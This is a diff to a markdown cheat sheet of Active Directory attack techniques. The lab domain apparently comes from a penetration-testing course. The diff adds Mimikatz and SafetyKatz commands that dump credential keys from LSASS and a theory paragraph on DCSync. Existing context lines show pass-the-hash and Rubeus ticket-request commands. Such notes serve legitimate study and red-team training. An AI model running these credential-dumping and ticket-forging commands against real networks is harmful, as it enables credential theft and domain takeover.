@@ -292,6 +292,18 @@ From a Linux attacking machine using impacket.
 
 ### Lateral Movement - Credential Extraction - LSASS
 
+Dump credentials on a using Mimikatz.
+```
+mimikatz.exe -Command '"sekurlsa::ekeys"'
+```
+
+Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
+ ```
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+
+### Lateral Movement - OverPass-The-Hash
+
 Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
 ```
 SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
@@ -309,6 +321,10 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 ```
 
 ### Lateral Movement - DCSync
+**Theory**
+DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. 
+This attack can lead to the compromise of major credential material such as the Kerberos krbtgt keys used legitimately for tickets creation, but also for tickets forging by attackers. The consequences of this attack are similar to an NTDS.dit dump and parsing but the practical aspect differ.
+
 * To extract credentials from the DC without code execution on it, we can use DCSync. 
 * To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for dcorp domain
 
